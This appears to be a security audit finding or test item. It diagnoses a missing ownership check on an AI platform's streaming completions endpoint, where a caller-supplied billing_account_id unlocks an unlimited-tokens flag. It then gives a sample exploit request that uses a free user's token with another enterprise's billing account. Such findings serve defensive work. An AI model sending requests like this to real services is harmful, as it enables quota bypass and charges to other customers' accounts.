diagnosis: The AI inference route evaluates the ai_unlimited_tokens feature flag against billing_account_id provided directly in the request payload. It does not verify that current_user owns or belongs to billing_account_id, allowing callers to supply another enterprise's billing account ID to bypass quota restrictions.
exploit_request:
POST /ai/completions/stream HTTP/1.1
Host: api.llmplatform.ai
Authorization: Bearer <free_user_jwt>
Content-Type: application/json

{"billing_account_id": "acc_enterprise_corp_tier3", "prompt": "Summarize internal data..."}
